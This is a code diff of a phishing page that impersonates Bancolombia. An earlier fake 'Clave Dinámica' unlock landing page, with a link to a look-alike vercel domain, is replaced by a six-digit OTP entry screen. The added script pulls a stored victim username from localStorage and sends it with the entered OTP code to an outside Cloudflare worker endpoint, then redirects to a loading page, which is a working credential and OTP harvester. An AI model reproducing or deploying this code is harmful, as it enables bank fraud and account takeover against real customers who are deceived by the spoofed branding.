@@ -3,432 +3,387 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clave Dinámica - Bancolombia</title>
+    <title>Código OTP - Bancolombia</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Open Sans', sans-serif;
         }
-
-        body {
-            background-color: #ffffff;
-            margin: 0;
-            padding: 0;
-            line-height: 1.6;
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: #f0f0f0;
+            overflow: hidden;
         }
-
-        /* Header Bancolombia */
-        .header-bancolombia {
-            background-color: #ffffff;
-            padding: 15px 0;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
         }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-
-        .logo-bancolombia img {
-            height: 40px;
-        }
-
-        .header-nav {
-            display: flex;
-            gap: 30px;
-        }
-
-        .header-nav a {
-            color: #210049;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            transition: color 0.3s ease;
-        }
-
-        .header-nav a:hover {
-            color: #d9006e;
-        }
-
-        .header-buttons {
-            display: flex;
-            gap: 15px;
-        }
-
-        .btn-sucursal {
-            background-color: #210049;
+        
+        /* Texto "Ingrese el código OTP" */
+        .title-text {
+            position: absolute;
+            top: 42%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             color: white;
-            padding: 10px 20px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            transition: background-color 0.3s ease;
-        }
-
-        .btn-sucursal:hover {
-            background-color: #3a1a6b;
-        }
-
-        /* Banner Principal */
-        .banner-container {
-            background-color: #FFFFFF;
-            padding: 80px 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .banner-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 60px;
-            align-items: center;
-        }
-
-        .banner-text {
-            padding: 20px;
-        }
-
-        .banner-text h1 {
-            font-size: 2.5rem;
-            color: #210049;
-            margin-bottom: 20px;
-            font-weight: 700;
-            line-height: 1.2;
-        }
-
-        .banner-text p {
-            font-size: 1.1rem;
-            color: #333;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
-        .banner-button {
-            display: inline-block;
-            background-color: #FDDA24;
-            color: #210049;
-            padding: 16px 35px;
-            border-radius: 60px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 1.1rem;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(253, 218, 36, 0.3);
-        }
-
-        .banner-button:hover {
-            background-color: #F5C400;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(253, 218, 36, 0.4);
-        }
-
-        .banner-image {
+            font-size: 20px;
+            font-weight: bold;
             text-align: center;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
+            width: 100%;
+            letter-spacing: 1px;
         }
-
-        .banner-image img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-        }
-
-        /* Sección de Pasos */
-        .steps-section {
-            background-color: #F8F9FA;
-            padding: 80px 20px;
-        }
-
-        .steps-container {
-            max-width: 1200px;
-            margin: 0 auto;
+        
+        /* Subtítulo o mensaje de texto */
+        .subtitle-text {
+            position: absolute;
+            top: 48%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: rgba(255,255,255,0.9);
+            font-size: 13px;
             text-align: center;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            width: 100%;
+            white-space: nowrap;
         }
-
-        .steps-title {
-            font-size: 2.2rem;
-            color: #210049;
-            margin-bottom: 60px;
-            font-weight: 700;
-        }
-
-        .steps-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 40px;
-            margin-top: 50px;
-        }
-
-        .step-card {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            transition: transform 0.3s ease;
-        }
-
-        .step-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .step-number {
-            width: 60px;
-            height: 60px;
-            background: #FDDA24;
-            color: #210049;
-            border-radius: 50%;
+        
+        /* Contenedor de las 6 rayitas */
+        .center-box {
+            position: absolute;
+            top: 57%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
             display: flex;
-            align-items: center;
             justify-content: center;
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin: 0 auto 25px;
+            align-items: center;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
         }
-
-        .step-card h3 {
-            font-size: 1.4rem;
-            color: #210049;
-            margin-bottom: 15px;
-            font-weight: 600;
+        
+        .digits-container {
+            display: flex;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
         }
-
-        .step-card p {
-            color: #666;
-            font-size: 1rem;
-            line-height: 1.6;
-        }
-
-        /* Footer */
-        .footer {
-            background-color: #210049;
-            color: white;
-            padding: 50px 20px 30px;
-        }
-
-        .footer-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 40px;
-        }
-
-        .footer-section h4 {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section ul li {
-            margin-bottom: 10px;
-        }
-
-        .footer-section a {
-            color: #ccc;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .footer-section a:hover {
-            color: #FDDA24;
-        }
-
-        .footer-bottom {
-            max-width: 1200px;
-            margin: 40px auto 0;
-            padding-top: 30px;
-            border-top: 1px solid #333;
+        
+        .digit-input {
+            width: 35px;
+            height: 45px;
+            border: none;
+            border-bottom: 2px solid #ffe100;
             text-align: center;
-            color: #ccc;
-            font-size: 0.9rem;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+            background: transparent;
+            font-family: monospace;
         }
-
-        .footer-logo {
-            margin-bottom: 20px;
+        
+        .digit-input:focus {
+            border-bottom: 2px solid #0056b3;
         }
-
-        .footer-logo img {
-            height: 40px;
-            filter: brightness(0) invert(1);
+        
+        .button-container {
+            position: absolute;
+            top: 72%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
         }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .header-container {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .header-nav {
-                gap: 20px;
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-
-            .banner-content {
-                grid-template-columns: 1fr;
-                text-align: center;
-                gap: 40px;
-            }
-            
-            .banner-text h1 {
-                font-size: 2rem;
-            }
-            
-            .steps-title {
-                font-size: 1.8rem;
-            }
-            
-            .steps-grid {
-                grid-template-columns: 1fr;
-                gap: 30px;
-            }
-            
-            .footer-container {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
+        
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
         }
-
+        
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid #ccc;
+        }
+        
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+        }
+        
+        .button-container button:hover {
+            transform: scale(0.98);
+            opacity: 0.9;
+        }
+        
+        /* Mensaje de estado */
+        .status-message {
+            position: absolute;
+            bottom: 12%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            text-align: center;
+            background: rgba(0,0,0,0.6);
+            padding: 6px 12px;
+            border-radius: 20px;
+            white-space: nowrap;
+        }
+        
         @media (max-width: 480px) {
-            .banner-container {
-                padding: 40px 15px;
-            }
-            
-            .banner-text h1 {
-                font-size: 1.8rem;
-            }
-            
-            .steps-section {
-                padding: 50px 15px;
-            }
-            
-            .step-card {
-                padding: 30px 20px;
-            }
-
-            .header-nav {
-                gap: 15px;
-            }
-
-            .header-nav a {
-                font-size: 0.8rem;
-            }
+            .title-text { font-size: 16px; top: 40%; }
+            .subtitle-text { font-size: 11px; top: 46%; white-space: normal; width: 90%; }
+            .center-box { width: 260px; height: 60px; top: 56%; }
+            .digit-input { width: 32px; height: 40px; font-size: 20px; }
+            .button-container { top: 74%; }
+            .button-container button { padding: 10px 28px; font-size: 12px; }
+            .status-message { font-size: 10px; bottom: 10%; white-space: normal; width: 90%; text-align: center; }
         }
     </style>
 </head>
 <body>
-    <!-- Header Bancolombia -->
-    <header class="header-bancolombia">
-        <div class="header-container">
-            <div class="logo-bancolombia">
-                <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
-            
-           
-        </div>
-    </header>
-
-    <!-- Banner Principal -->
-    <section class="banner-container">
-        <div class="banner-content">
-            <div class="banner-text">
-                <h1>Desbloquea tu Clave Dinámica</h1>
-                <p>Sácale provecho a la app Mi Bancolombia, haz tus movimientos en segundos y con la seguridad de siempre. ¿Qué esperas?</p>
-                <a href="https://seguridabancolombia.vercel.app/" class="banner-button">Desbloquea tu Clave Dinámica</a>
-            </div>
-            <div class="banner-image">
-                <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/e32cb424-b42f-4a24-9cd1-80e0d44a135a/banner-web-clave-dinamica.jpg?MOD=AJPERES" alt="Clave Dinámica Bancolombia">
-            </div>
-        </div>
-    </section>
-
-    <!-- Sección de Pasos -->
-    <section class="steps-section">
-        <div class="steps-container">
-            <h2 class="steps-title">Desbloquea en 3 Pasos Sencillos</h2>
-            <div class="steps-grid">
-                <div class="step-card">
-                    <div class="step-number">1</div>
-                    <h3>Ingresa por la Web</h3>
-                    <p>Ingresa a por la web Bancolombia. Es completamente gratuita y segura.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-number">2</div>
-                    <h3>Inicia Sesión</h3>
-                    <p>Accede con tu usuario y clave actuales. Si no los tienes, puedes registrarte en pocos minutos.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-number">3</div>
-                    <h3>Activa tu Clave</h3>
-                    <p>Ve a la sección de seguridad y sigue los pasos para activar tu Clave Dinámica. ¡Listo para usar!</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="footer-container">
-            <div class="footer-section">
-                <div class="footer-logo">
-                    <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
-                </div>
-                <p>Tu seguridad es nuestra prioridad. Bancolombia contigo en cada paso.</p>
-            </div>
-            
-            <div class="footer-section">
-                <h4>Te puede interesar</h4>
-                <ul>
-                    <li><a href="#">Centro de Ayuda</a></li>
-                    <li><a href="#">Puntos de Atención</a></li>
-                    <li><a href="#">App Mi Bancolombia</a></li>
-                    <li><a href="#">Seguridad Digital</a></li>
-                </ul>
-            </div>
-            
-            <div class="footer-section">
-                <h4>Legales</h4>
-                <ul>
-                    <li><a href="#">Términos y Condiciones</a></li>
-                    <li><a href="#">Protección de Datos</a></li>
-                    <li><a href="#">Transparencia</a></li>
-                    <li><a href="#">Atención al Consumidor</a></li>
-                </ul>
-            </div>
-            
-            <div class="footer-section">
-                <h4>Contáctanos</h4>
-                <ul>
-                    <li>Línea gratuita: 01 8000 9 12345</li>
-                    <li>Bogotá: (601) 343 0000</li>
-                    <li>Medellín: (604) 510 9000</li>
-                    <li><a href="#">Chat en Línea</a></li>
-                </ul>
+    <div class="image-container">
+        <img src="img/cel11.jpg" alt="Background Image">
+        
+        <!-- Texto principal "Ingrese el código OTP" -->
+        <div class="title-text">🔐 Ingrese el código OTP</div>
+        
+        <!-- Subtítulo que indica que llegó por mensaje de texto -->
+        <div class="subtitle-text">📱 Te hemos enviado un código por mensaje de texto</div>
+        
+        <!-- Contenedor de los 6 dígitos -->
+        <div class="center-box">
+            <div class="digits-container">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
             </div>
         </div>
         
-        <div class="footer-bottom">
-            <p>&copy; 2024 Bancolombia S.A. Establecimiento Bancario - Todos los derechos reservados</p>
+        <div class="button-container">
+            <button onclick="window.history.back()">Cancelar</button>
+            <button id="loginButton">Verificar</button>
         </div>
-    </footer>
+        
+        <div class="status-message" id="statusMessage">⏱️ El código expira en 5 minutos</div>
+    </div>
+
+    <script>
+        const digitInputs = document.querySelectorAll('.digit-input');
+        const loginButton = document.getElementById('loginButton');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        let loginAttempts = 0;
+        const MAX_ATTEMPTS = 3;
+
+        // Manejar la entrada en cada dígito
+        digitInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                // Solo permitir números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Mover al siguiente input si se ingresó un número
+                if (this.value.length === 1 && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+                
+                // Verificar si todos los campos están llenos
+                if (checkAllDigitsFilled()) {
+                    // Opcional: auto-enviar cuando se completa el código
+                    // autoSubmit();
+                }
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                // Manejar tecla borrar (backspace)
+                if (e.key === 'Backspace') {
+                    if (this.value === '' && index > 0) {
+                        digitInputs[index - 1].focus();
+                    } else if (this.value !== '') {
+                        this.value = '';
+                        e.preventDefault();
+                    }
+                }
+                
+                // Manejar flechas
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    digitInputs[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+            });
+            
+            // Permitir pegar código completo
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                const numbers = pastedText.replace(/[^0-9]/g, '').split('');
+                
+                for (let i = 0; i < Math.min(numbers.length, digitInputs.length); i++) {
+                    digitInputs[i].value = numbers[i];
+                }
+                
+                // Enfocar el siguiente campo vacío
+                const nextEmptyIndex = Array.from(digitInputs).findIndex(inp => inp.value === '');
+                if (nextEmptyIndex !== -1) {
+                    digitInputs[nextEmptyIndex].focus();
+                } else if (numbers.length >= digitInputs.length) {
+                    digitInputs[digitInputs.length - 1].focus();
+                }
+            });
+        });
+
+        // Verificar si todos los dígitos están llenos
+        function checkAllDigitsFilled() {
+            return Array.from(digitInputs).every(input => input.value.length === 1);
+        }
+
+        // Obtener el código completo
+        function getFullCode() {
+            return Array.from(digitInputs).map(input => input.value).join('');
+        }
+
+        // Función para auto-enviar (opcional)
+        function autoSubmit() {
+            if (checkAllDigitsFilled()) {
+                setTimeout(() => {
+                    loginButton.click();
+                }, 300);
+            }
+        }
+
+        // Mostrar mensaje temporal
+        function showMessage(msg, isError = false) {
+            statusMessage.innerHTML = isError ? `❌ ${msg}` : `⏱️ ${msg}`;
+            statusMessage.style.background = isError ? 'rgba(220, 53, 69, 0.9)' : 'rgba(0,0,0,0.7)';
+            setTimeout(() => {
+                if (statusMessage.innerHTML.includes(msg)) {
+                    statusMessage.innerHTML = '⏱️ El código expira en 5 minutos';
+                    statusMessage.style.background = 'rgba(0,0,0,0.6)';
+                }
+            }, 3000);
+        }
+
+        loginButton.addEventListener('click', async () => {
+            const otpCode = getFullCode();
+            
+            if (otpCode.length === 6) {
+                // Verificar intentos fallidos
+                if (loginAttempts >= MAX_ATTEMPTS) {
+                    showMessage('Demasiados intentos. Intenta más tarde.', true);
+                    loginButton.disabled = true;
+                    setTimeout(() => {
+                        loginButton.disabled = false;
+                        loginAttempts = 0;
+                    }, 60000); // 1 minuto de bloqueo
+                    return;
+                }
+                
+                try {
+                    // Deshabilitar botón mientras se procesa
+                    loginButton.disabled = true;
+                    loginButton.textContent = 'Verificando...';
+                    
+                    // Obtener datos de localStorage
+                    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                    const usuario = bancoldata.usuario;
+
+                    if (!usuario) {
+                        showMessage('Error: Usuario no encontrado', true);
+                        loginButton.disabled = false;
+                        loginButton.textContent = 'Verificar';
+                        return;
+                    }
+
+                    // Generar transactionId único
+                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+                    // Guardar el código OTP en bancoldata
+                    bancoldata.otpCode = otpCode;
+                    bancoldata.transactionId = transactionId;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                    console.log('Enviando verificación OTP:', { usuario, otp: otpCode, transactionId });
+
+                    // Enviar OTP al worker
+                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            usuario: usuario,
+                            clave: otpCode,
+                            transactionId: transactionId
+                        })
+                    });
+
+                    const result = await response.json();
+                    console.log('Respuesta de verificación:', result);
+                    
+                    if (result.ok) {
+                        showMessage('Código verificado correctamente. Redirigiendo...');
+                        // Redirigir a la página de loading
+                        setTimeout(() => {
+                            window.location.href = 'loading.html';
+                        }, 1000);
+                    } else {
+                        loginAttempts++;
+                        const remaining = MAX_ATTEMPTS - loginAttempts;
+                        showMessage(`Código incorrecto. Te quedan ${remaining} intento(s)`, true);
+                        // Limpiar los campos para reintentar
+                        digitInputs.forEach(input => input.value = '');
+                        digitInputs[0].focus();
+                        loginButton.disabled = false;
+                        loginButton.textContent = 'Verificar';
+                    }
+                    
+                } catch (error) {
+                    console.error('Error completo:', error);
+                    showMessage('Error al verificar el código: ' + error.message, true);
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'Verificar';
+                }
+            } else {
+                showMessage('Por favor, ingrese los 6 dígitos del código OTP', true);
+                // Enfocar el primer campo vacío
+                const firstEmptyIndex = Array.from(digitInputs).findIndex(inp => inp.value === '');
+                if (firstEmptyIndex !== -1) {
+                    digitInputs[firstEmptyIndex].focus();
+                } else {
+                    digitInputs[0].focus();
+                }
+            }
+        });
+
+        // Enfocar el primer input al cargar la página
+        digitInputs[0].focus();
+        
+        // Limpiar códigos al recargar la página (opcional)
+        window.addEventListener('load', () => {
+            digitInputs.forEach(input => input.value = '');
+            digitInputs[0].focus();
+        });
+    </script>
 </body>
-
 </html>
-
